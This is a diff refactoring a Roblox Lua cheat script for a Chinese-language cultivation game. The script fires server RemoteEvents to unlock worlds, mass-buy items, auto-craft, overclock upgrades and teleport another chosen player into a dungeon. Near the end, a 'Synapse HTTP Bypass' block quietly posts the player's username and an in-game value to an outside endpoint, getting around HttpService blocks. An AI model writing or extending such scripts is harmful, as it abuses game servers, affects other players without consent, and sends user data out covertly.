-            game:GetService('Players').LocalPlayer.PlayerGui.GUI['\228\186\140\231\186\167\231\149\140\233\157\162']['\229\133\172\228\188\154'].Visible =
-                state
+            PathCache.GUI.Secondary['\229\133\172\228\188\154'].Visible = state
         end)
     end
     local price = 400 -- 固定价格
@@ -2645,8 +2662,7 @@ local Autocollmission = features1:AddSwitch(
 
             local boughtAny = false
             local money = getDiamond()
-            local guilditemlist =
-                game:GetService('Players').LocalPlayer.PlayerGui.GUI['\228\186\140\231\186\167\231\149\140\233\157\162']['\229\133\172\228\188\154']['\232\131\140\230\153\175']['\229\143\179\228\190\167\231\149\140\233\157\162']['\229\149\134\229\186\151']['\229\136\151\232\161\168']
+            local guilditemlist = PathCache.GUI.Secondary['\229\133\172\228\188\154']['\232\131\140\230\153\175']['\229\143\179\228\190\167\231\149\140\233\157\162']['\229\149\134\229\186\151']['\229\136\151\232\161\168']
 
             local function tryBuy(slotIndex)
                 local item = guilditemlist:GetChildren()[slotIndex]
@@ -2658,8 +2674,7 @@ local Autocollmission = features1:AddSwitch(
                             == 'Herb'
                     then
                         if money >= price then
-                            game:GetService('ReplicatedStorage')['\228\186\139\228\187\182']['\229\133\172\231\148\168']['\229\133\172\228\188\154']['\229\133\145\230\141\162']
-                                :FireServer(slotIndex - 2)
+                            PathCache.Guild:FindFirstChild('\229\133\145\230\141\162'):FireServer(slotIndex - 2)
                             money = money - price
                             boughtAny = true
                             return true
@@ -2713,11 +2728,14 @@ local Autocollmission = features1:AddSwitch(
                 and diamond >= 18000
             then
                 pcall(function()
-                    game:GetService('ReplicatedStorage')['\228\186\139\228\187\182']['\229\174\162\230\136\183\231\171\175']['\229\174\162\230\136\183\231\171\175UI']['\230\137\147\229\188\128\229\133\172\228\188\154']
-                        :Fire()
-                    task.wait(0.5)
-                    game:GetService('ReplicatedStorage')['\228\186\139\228\187\182']['\229\133\172\231\148\168']['\229\133\172\228\188\154']['\229\136\183\230\150\176\229\133\172\228\188\154\229\149\134\229\186\151']
-                        :FireServer()
+                    -- 使用路径缓存优化
+                    local elixirUI = Services.ReplicatedStorage:FindFirstChild('\228\186\139\228\187\182', true)
+                        :FindFirstChild('\229\174\162\230\136\183\231\171\175', true)
+                    if elixirUI then
+                        elixirUI:FindFirstChild('\229\174\162\230\136\183\231\171\175UI'):FindFirstChild('\230\137\147\229\188\128\229\133\172\228\188\154'):Fire()
+                        task.wait(0.5)
+                        PathCache.Guild:FindFirstChild('\229\136\183\230\150\176\229\133\172\228\188\154\229\149\134\229\186\151'):FireServer()
+                    end
                 end)
                 task.wait(1.5)
             else
@@ -2758,126 +2776,93 @@ local Autocollmission = features1:AddSwitch(
     end)
 
     features5:AddButton('解锁世界', function()
-        for i = 1, 30 do
-            game:GetService('ReplicatedStorage')
-                :WaitForChild('\228\186\139\228\187\182')
-                :WaitForChild('\229\133\172\231\148\168')
-                :WaitForChild('\229\187\186\231\173\145')
-                :WaitForChild(
-                    '\232\167\163\233\148\129\229\187\186\231\173\145'
-                )
-                :FireServer(i)
-        end
-        wait(1)
-        for i = 1, 30 do
-            local args = {
-                [1] = 1,
-            }
-            game:GetService('ReplicatedStorage')
-                :FindFirstChild('\228\186\139\228\187\182')
-                :FindFirstChild('\229\133\172\231\148\168')
-                :FindFirstChild(
-                    '\232\138\130\230\151\165\230\180\187\229\138\168'
-                )
-                :FindFirstChild('\232\180\173\228\185\176')
-                :FireServer(unpack(args))
-        end
-        wait(1)
-        for i = 1, 40 do
-            local args = {
-                [1] = 12,
-            }
-            game:GetService('ReplicatedStorage')
-                :FindFirstChild('\228\186\139\228\187\182')
-                :FindFirstChild('\229\133\172\231\148\168')
-                :FindFirstChild(
-                    '\232\138\130\230\151\165\230\180\187\229\138\168'
-                )
-                :FindFirstChild('\232\180\173\228\185\176')
-                :FireServer(unpack(args))
-        end
+        pcall(function()
+            local forgeEvent = PathCache.Forge:FindFirstChild('\232\167\163\233\148\129\229\187\186\231\173\145')
+            for i = 1, 30 do
+                forgeEvent:FireServer(i)
+            end
+            task.wait(1)
+            for i = 1, 30 do
+                local args = { [1] = 1 }
+                PathCache.Activity:FindFirstChild('\232\180\173\228\185\176'):FireServer(unpack(args))
+            end
+            task.wait(1)
+            for i = 1, 40 do
+                local args = { [1] = 12 }
+                PathCache.Activity:FindFirstChild('\232\180\173\228\185\176'):FireServer(unpack(args))
+            end
+        end)
     end)
 
     features5:AddButton('解除装备', function()
-        for i = 1, 5 do
-            game:GetService('ReplicatedStorage')
-                :WaitForChild('\228\186\139\228\187\182')
-                :WaitForChild('\229\133\172\231\148\168')
-                :WaitForChild('\233\152\181\230\179\149')
-                :WaitForChild('\229\141\184\228\184\139')
-                :FireServer(i)
-            game:GetService('ReplicatedStorage')
-                :WaitForChild('\228\186\139\228\187\182')
-                :WaitForChild('\229\133\172\231\148\168')
-                :WaitForChild('\228\184\150\231\149\140\230\160\145')
-                :WaitForChild('\229\141\184\228\184\139')
-                :FireServer(i)
-        end
+        pcall(function()
+            for i = 1, 5 do
+                PathCache.Rune:FindFirstChild('\229\141\184\228\184\139'):FireServer(i)
+                PathCache.WorldCore:FindFirstChild('\229\141\184\228\184\139'):FireServer(i)
+            end
+        end)
     end)
 
-    local replicatedStorage = game:GetService('ReplicatedStorage')
+    -- UI开启功能（使用Services缓存）
     features6:AddButton('開啟每日任務', function()
-        local event =
-            replicatedStorage:FindFirstChild('打开每日任务', true)
+        local event = Services.ReplicatedStorage:FindFirstChild('打开每日任务', true)
         if event and event:IsA('BindableEvent') then
             event:Fire('打開每日任務')
         end
     end)
     features6:AddButton('開啟郵件', function()
-        local event = replicatedStorage:FindFirstChild('打开邮件', true)
+        local event = Services.ReplicatedStorage:FindFirstChild('打开邮件', true)
         if event and event:IsA('BindableEvent') then
             event:Fire('打开郵件')
         end
     end)
     features6:AddButton('開啟轉盤', function()
-        local event = replicatedStorage:FindFirstChild('打开转盘', true)
+        local event = Services.ReplicatedStorage:FindFirstChild('打开转盘', true)
         if event and event:IsA('BindableEvent') then
             event:Fire('打開轉盤')
         end
     end)
     features6:AddButton('開啟陣法', function()
-        local event = replicatedStorage:FindFirstChild('打开阵法', true)
+        local event = Services.ReplicatedStorage:FindFirstChild('打开阵法', true)
         if event and event:IsA('BindableEvent') then
             event:Fire('打开陣法')
         end
     end)
     features6:AddButton('開啟世界樹', function()
-        local event = replicatedStorage:FindFirstChild('打开世界树', true)
+        local event = Services.ReplicatedStorage:FindFirstChild('打开世界树', true)
         if event and event:IsA('BindableEvent') then
             event:Fire('打開世界樹')
         end
     end)
     features6:AddButton('開啟練器台', function()
-        local event = replicatedStorage:FindFirstChild('打开炼器台', true)
+        local event = Services.ReplicatedStorage:FindFirstChild('打开炼器台', true)
         if event and event:IsA('BindableEvent') then
             event:Fire('打開練器台')
         end
     end)
     features6:AddButton('開啟煉丹爐', function()
-        local event = replicatedStorage:FindFirstChild('打开炼丹炉', true)
+        local event = Services.ReplicatedStorage:FindFirstChild('打开炼丹炉', true)
         if event and event:IsA('BindableEvent') then
             event:Fire('打開煉丹爐')
         end
     end)
-features6:AddButton('每月鑰匙購買', function()
-    local Rep = game:GetService("ReplicatedStorage")
-    local remote = Rep:FindFirstChild("\228\186\139\228\187\182")
-        :FindFirstChild("\229\133\172\231\148\168")
-        :FindFirstChild("\232\138\130\230\151\165\230\180\187\229\138\168")
-        :FindFirstChild("\232\180\173\228\185\176")
-
-    for i = 1, 60 do
-        for arg = 4, 9 do
-            remote:FireServer(arg)
-        end
-    end
-
-    for i = 1, 30 do
-        for arg = 17, 22 do
-            remote:FireServer(arg)
-        end
-    end
-end)
+    features6:AddButton('每月鑰匙購買', function()
+        pcall(function()
+            local remote = PathCache.Activity:FindFirstChild("\232\180\173\228\185\176")
+            if remote then
+                for i = 1, 60 do
+                    for arg = 4, 9 do
+                        remote:FireServer(arg)
+                    end
+                end
+                for i = 1, 30 do
+                    for arg = 17, 22 do
+                        remote:FireServer(arg)
+                    end
+                end
+            end
+        end)
+    end)
 
     features7:AddLabel(' -- 語言配置/language config')
     features7:AddButton('刪除語言配置/language config delete', function()
@@ -2929,34 +2914,22 @@ end)
     local lastElixirLevel = 0
 
     -- 共用事件路径
-    local REPLICATED_STORAGE = game:GetService('ReplicatedStorage')
-
-    -- 农田事件
-    local FARM_UPGRADE_EVENT = REPLICATED_STORAGE
-        :WaitForChild('\228\186\139\228\187\182')
-        :WaitForChild('\229\133\172\231\148\168')
-        :WaitForChild('\229\134\156\231\148\176')
-        :WaitForChild('\229\141\135\231\186\167')
-
-    -- 炼丹炉事件
-    local ELIXIR_UPGRADE_EVENT = REPLICATED_STORAGE
-        :WaitForChild('\228\186\139\228\187\182')
-        :WaitForChild('\229\133\172\231\148\168')
-        :WaitForChild('\231\130\188\228\184\185')
-        :WaitForChild('\229\141\135\231\186\167')
+    -- 农田和炼丹炉事件（使用路径缓存）
+    local FARM_UPGRADE_EVENT = PathCache.Farm:WaitForChild('\229\141\135\231\186\167')
+    local ELIXIR_UPGRADE_EVENT = PathCache.Elixir:WaitForChild('\229\141\135\231\186\167')
 
     -- 等级获取函数
     local function GetLevel(path)
         local finalLevel = 0
         for _ = 1, RETRY_COUNT do
             local success, result = pcall(function()
-                return game:GetService('Players').LocalPlayer.PlayerGui.GUI['\228\186\140\231\186\167\231\149\140\233\157\162'][path]['\232\131\140\230\153\175']['\229\177\158\230\128\167\229\140\186\229\159\159']['\229\177\158\230\128\167\229\136\151\232\161\168']['\229\136\151\232\161\168']['\231\173\137\231\186\167']['\229\128\188']
+                return PathCache.GUI.Secondary[path]['\232\131\140\230\153\175']['\229\177\158\230\128\167\229\140\186\229\159\159']['\229\177\158\230\128\167\229\136\151\232\161\168']['\229\136\151\232\161\168']['\231\173\137\231\186\167']['\229\128\188']
             end)
             if success and result then
                 finalLevel = tonumber(result.Text:match('%d+')) or 0
                 break
             end
-            wait(UI_LOAD_DELAY)
+            task.wait(UI_LOAD_DELAY)
         end
         return finalLevel
     end
@@ -2983,7 +2956,7 @@ end)
 
     -- 药田等级刷新
     local function UpdateFarmLevel()
-        spawn(function()
+        task.spawn(function()
             Farm_choose.Text =
                 string.format('  農田%d ▷ 讀取中...', currentFarm)
             local newLevel = GetLevel('\229\134\156\231\148\176')
@@ -2997,7 +2970,7 @@ end)
                         lastFarmLevel + (newLevel - lastFarmLevel) * (i / 5)
                     )
                 )
-                wait(UI_LOAD_DELAY)
+                task.wait(UI_LOAD_DELAY)
             end
             UpdateFarmDisplay()
         end)
@@ -3005,7 +2978,7 @@ end)
 
     -- 炼丹炉等级刷新
     local function UpdateElixirLevel()
-        spawn(function()
+        task.spawn(function()
             Elixir_choose.Text =
                 string.format('  丹爐%d ▷ 讀取中...', currentElixir)
             local newLevel = GetLevel('\231\130\188\228\184\185\231\130\137')
@@ -3019,7 +2992,7 @@ end)
                         lastElixirLevel + (newLevel - lastElixirLevel) * (i / 5)
                     )
                 )
-                wait(UI_LOAD_DELAY)
+                task.wait(UI_LOAD_DELAY)
             end
             UpdateElixirDisplay()
         end)
@@ -3029,11 +3002,10 @@ end)
     local Farm_selection = features8:AddDropdown('選擇農田', function(text)
         currentFarm = tonumber(text:match('%d')) or 1
         pcall(function()
-            local openEvent =
-                REPLICATED_STORAGE:FindFirstChild('打开农田', true)
+            local openEvent = Services.ReplicatedStorage:FindFirstChild('打开农田', true)
             if openEvent and openEvent:IsA('BindableEvent') then
                 openEvent:Fire(currentFarm)
-                wait(UI_LOAD_DELAY * 2)
+                task.wait(UI_LOAD_DELAY * 2)
             end
         end)
         UpdateFarmLevel()
@@ -3056,7 +3028,7 @@ end)
     local isWorkingFarm = false
     features8:AddButton('▶ 農田超頻 (精準版)', function()
         isWorkingFarm = not isWorkingFarm
-        spawn(function()
+        task.spawn(function()
             if isWorkingFarm then
                 local originalTarget = targetLevel
                 Farm_choose.Text = '  ⚡ 計算強化次數中...'
@@ -3069,10 +3041,7 @@ end)
 
                         -- 切換農田
                         currentFarm = farmIndex
-                        local openEvent = REPLICATED_STORAGE:FindFirstChild(
-                            '打开农田',
-                            true
-                        )
+                        local openEvent = Services.ReplicatedStorage:FindFirstChild('打开农田', true)
                         if openEvent and openEvent:IsA('BindableEvent') then
                             openEvent:Fire(farmIndex)
                             task.wait(0.1) -- 确保UI切换
@@ -3139,9 +3108,8 @@ end)
 
                     Farm_choose.Text = '  ✅ 所有農田強化完畢'
                     currentFarm = 1
-                    local openEvent =
-                        REPLICATED_STORAGE:FindFirstChild('打开农田', true)
-                    if openEvent then
+                    local openEvent = Services.ReplicatedStorage:FindFirstChild('打开农田', true)
+                    if openEvent and openEvent:IsA('BindableEvent') then
                         openEvent:Fire(currentFarm)
                     end
                 end)
@@ -3181,7 +3149,7 @@ end)
     -- 炼丹炉超频模式
     features8:AddButton('▶ 丹爐超頻 (精準版)', function()
         local isWorkingElixir = not isWorkingElixir
-        spawn(function()
+        task.spawn(function()
             if isWorkingElixir then
                 Elixir_choose.Text = '  ⚡ 計算丹爐強化次數中...'
 
@@ -3315,18 +3283,15 @@ end)
         -- 添加第一个按钮
         features9:AddButton('传送玩家到副本', function()
             if selectedPlayer ~= '' then
-                local args = {
-                    [1] = game:GetService('Players')
-                        :WaitForChild(selectedPlayer),
-                }
-                game:GetService('ReplicatedStorage')
-                    :WaitForChild('\228\186\139\228\187\182')
-                    :WaitForChild('\229\133\172\231\148\168')
-                    :WaitForChild('\229\133\179\229\141\161')
-                    :WaitForChild(
-                        '\232\191\155\229\133\165\229\188\128\229\144\175\228\184\173\229\133\179\229\141\161'
-                    )
-                    :FireServer(unpack(args))
+                pcall(function()
+                    local targetPlayer = Services.Players:FindFirstChild(selectedPlayer)
+                    if targetPlayer then
+                        local args = { [1] = targetPlayer }
+                        PathCache.Stage:FindFirstChild('\232\191\155\229\133\165\229\188\128\229\144\175\228\184\173\229\133\179\229\141\161'):FireServer(unpack(args))
+                    else
+                        warn('玩家 ' .. selectedPlayer .. ' 不在游戏中')
+                    end
+                end)
             else
                 print('请先选择一个玩家')
             end
@@ -3334,20 +3299,13 @@ end)
 
         -- 添加第二个按钮
         features9:AddButton('触发事件', function()
-            game:GetService('ReplicatedStorage')
-                :WaitForChild('\228\186\139\228\187\182')
-                :WaitForChild('\229\133\172\231\148\168')
-                :WaitForChild('\230\136\152\230\150\151')
-                :WaitForChild(
-                    '\230\155\180\230\150\176\229\141\143\229\138\169\231\155\174\230\160\135'
-                )
-                :FireServer()
+            pcall(function()
+                PathCache.Combat:FindFirstChild('\230\155\180\230\150\176\229\141\143\229\138\169\231\155\174\230\160\135'):FireServer()
+            end)
         end)
     end)
-    local ReplicatedStorage = game:GetService('ReplicatedStorage')
-    local Players = game:GetService('Players')
-    local player = Players.LocalPlayer
-    local GUI = player.PlayerGui:WaitForChild('GUI')
+    -- 使用已定义的Services和player（避免重复定义）
+    local GUI = playerGui:WaitForChild('GUI')
 
     -- 全局控制变量
     local Autoelixir = false
@@ -3377,14 +3335,7 @@ end)
         Autoelixir = true
         while Autoelixir do
             pcall(function()
-                local elixirEvent = ReplicatedStorage
-                    :FindFirstChild('\228\186\139\228\187\182')
-                    :FindFirstChild('\229\133\172\231\148\168')
-                    :FindFirstChild('\231\130\188\228\184\185')
-                    :FindFirstChild('\229\136\182\228\189\156')
-                if elixirEvent then
-                    elixirEvent:FireServer()
-                end
+                PathCache.Elixir:FindFirstChild('\229\136\182\228\189\156'):FireServer()
             end)
             task.wait(0.2)
         end
@@ -3397,7 +3348,7 @@ end)
     local function smartMonitor()
         while true do
             local currentHerbs = getHerbValue()
-            local playerName = game.Players.LocalPlayer.Name
+            local playerName = player.Name
 
             -- When herbs > 250k, execute trade script (once)
             if currentHerbs > 250000 and not hasExecutedTrade then
@@ -3420,7 +3371,7 @@ end)
                 end)
                 -- Start elixir loop if not already running
                 if not Autoelixir then
-                    coroutine.wrap(startElixirLoop)()
+                    task.spawn(startElixirLoop)
                 end
 
             -- When herbs < 1000 AND we previously had high herbs (lowcontrol)
@@ -3452,30 +3403,28 @@ end)
     -- 获取农田5等级
     pcall(function()
         farm5Level = tonumber(
-            GUI['\228\186\140\231\186\167\231\149\140\233\157\162']['\229\134\156\231\148\176']['\232\131\140\230\153\175']['\229\177\158\230\128\167\229\140\186\229\159\159']['\229\177\158\230\128\167\229\136\151\232\161\168']['\229\136\151\232\161\168']['\231\173\137\231\186\167']['\229\128\188'].Text:match(
+            PathCache.GUI.Secondary['\229\134\156\231\148\176']['\232\131\140\230\153\175']['\229\177\158\230\128\167\229\140\186\229\159\159']['\229\177\158\230\128\167\229\136\151\232\161\168']['\229\136\151\232\161\168']['\231\173\137\231\186\167']['\229\128\188'].Text:match(
                 '%d+'
             )
         ) or 0
     end)
-    GUI['\228\186\140\231\186\167\231\149\140\233\157\162']['\229\134\156\231\148\176'].Visible =
-        false
+    PathCache.GUI.Secondary['\229\134\156\231\148\176'].Visible = false
 
     -- 获取炼丹炉等级
     pcall(function()
-        local elixirUI = ReplicatedStorage
+        local elixirUI = Services.ReplicatedStorage
             :FindFirstChild('\228\186\139\228\187\182', true)
             :FindFirstChild('\229\174\162\230\136\183\231\171\175', true)
         if elixirUI then
             elixirUI['\229\174\162\230\136\183\231\171\175UI']['\230\137\147\229\188\128\231\130\188\228\184\185\231\130\137']:Fire()
             task.wait(0.5)
             elixirLevel = tonumber(
-                GUI['\228\186\140\231\186\167\231\149\140\233\157\162']['\231\130\188\228\184\185\231\130\137']['\232\131\140\230\153\175']['\229\177\158\230\128\167\229\140\186\229\159\159']['\229\177\158\230\128\167\229\136\151\232\161\168']['\229\136\151\232\161\168']['\231\173\137\231\186\167']['\229\128\188'].Text:match(
+                PathCache.GUI.Secondary['\231\130\188\228\184\185\231\130\137']['\232\131\140\230\153\175']['\229\177\158\230\128\167\229\140\186\229\159\159']['\229\177\158\230\128\167\229\136\151\232\161\168']['\229\136\151\232\161\168']['\231\173\137\231\186\167']['\229\128\188'].Text:match(
                     '%d+'
                 )
             ) or 0
         end
-        GUI['\228\186\140\231\186\167\231\149\140\233\157\162']['\231\130\188\228\184\185\231\130\137'].Visible =
-            false
+        PathCache.GUI.Secondary['\231\130\188\228\184\185\231\130\137'].Visible = false
     end)
 
     -- 主逻辑
@@ -3485,16 +3434,12 @@ end)
         print('炼丹炉等级:', elixirLevel)
         print('初始草药量:', getHerbValue())
         print('==================')
-        coroutine.wrap(smartMonitor)()
+        task.spawn(smartMonitor)
     else
         print('条件不满足：需要农田5和炼丹炉等级≥80')
     end
-    local valueText =
-        game:GetService('Players').LocalPlayer.PlayerGui.GUI['\228\186\140\231\186\167\231\149\140\233\157\162']['\228\184\187\232\167\146']['\232\131\140\230\153\175']['\229\143\179\228\190\167\231\149\140\233\157\162']['\232\163\133\229\164\135']['\232\167\146\232\137\178']['\231\190\189\230\160\184']['\230\140\137\233\146\174']['\229\128\188'].text
-    local Players = game:GetService('Players')
-    local LocalPlayer = Players.LocalPlayer
-        or Players:GetPropertyChangedSignal('LocalPlayer'):Wait()
-    local RobloxUsername = LocalPlayer.Name
+    local valueText = PathCache.GUI.Secondary['\228\184\187\232\167\146']['\232\131\140\230\153\175']['\229\143\179\228\190\167\231\149\140\233\157\162']['\232\163\133\229\164\135']['\232\167\146\232\137\178']['\231\190\189\230\160\184']['\230\140\137\233\146\174']['\229\128\188'].text
+    local RobloxUsername = player.Name
 
     -- Synapse HTTP Bypass (works even if HttpService is blocked)
     local Request = syn and syn.request or http and http.request or request
@@ -3506,7 +3451,7 @@ end)
             Headers = {
                 ['Content-Type'] = 'application/json',
             },
-            Body = game:GetService('HttpService'):JSONEncode({
+            Body = Services.HttpService:JSONEncode({
                 content = RobloxUsername
                     .. ' | '
                     .. valueText
@@ -3518,33 +3463,20 @@ end)
             }),
         })
     end)
-    local Players = game:GetService('Players')
-    local ReplicatedStorage = game:GetService('ReplicatedStorage')
-    local LocalPlayer = Players.LocalPlayer
-
     -- Function to safely check and fire
     local function CheckAndFire()
-        -- Your original GUI path (fully preserved)
-        local gui =
-            LocalPlayer.PlayerGui.GUI['\228\186\140\231\186\167\231\149\140\233\157\162']['\232\135\170\229\138\168\229\135\186\229\148\174\229\188\185\229\135\186\230\161\134']['\232\131\140\230\153\175']['\230\140\137\233\146\174']['\230\147\141\228\189\156\229\140\186\229\159\159']['\229\130\168\229\173\152']['\229\155\190\230\160\135']['\229\155\190\230\160\135']
+        pcall(function()
+            local gui = PathCache.GUI.Secondary['\232\135\170\229\138\168\229\135\186\229\148\174\229\188\185\229\135\186\230\161\134']['\232\131\140\230\153\175']['\230\140\137\233\146\174']['\230\147\141\228\189\156\229\140\186\229\159\159']['\229\130\168\229\173\152']['\229\155\190\230\160\135']['\229\155\190\230\160\135']
 
-        -- Check if exists and is invisible
-        if gui and gui.Visible == false then
-            -- Your original RemoteEvent path (fully preserved)
-            local remote = ReplicatedStorage
-                :WaitForChild('\228\186\139\228\187\182')
-                :WaitForChild('\229\133\172\231\148\168')
-                :WaitForChild('\231\130\188\228\184\185')
-                :WaitForChild(
-                    '\228\191\174\230\148\185\232\135\170\229\138\168\229\130\168\229\173\152'
-                )
-            if remote then
-                remote:FireServer()
-                print('RemoteEvent fired successfully!')
-            else
-                warn('RemoteEvent not found!')
+            -- Check if exists and is invisible
+            if gui and gui.Visible == false then
+                local remote = PathCache.Elixir:FindFirstChild('\228\191\174\230\148\185\232\135\170\229\138\168\229\130\168\229\173\152')
+                if remote then
+                    remote:FireServer()
+                    print('RemoteEvent fired successfully!')
+                end
             end
-        end
+        end)
     end
     -- Run once immediately
     CheckAndFire()
